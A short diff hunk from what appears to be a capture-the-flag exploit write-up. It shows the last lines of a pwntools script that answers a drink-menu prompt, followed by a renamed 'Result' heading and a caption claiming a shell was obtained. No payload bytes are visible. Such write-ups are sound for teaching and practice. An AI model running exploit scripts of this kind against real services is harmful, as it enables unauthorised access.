@@ -61,6 +61,7 @@ r.sendlineafter(b"How many drinks do you want? ", b"1")
 r.sendlineafter(b"Select a drink: ", b"11")
 print(r.recvall().decode())
 
-## 0x06: Result
+## 5.Result 
+# 0x06: Result
 ![PoC](./screenshot.jpg)
 *Payload delivered. Shell popped. Mission accomplished.*
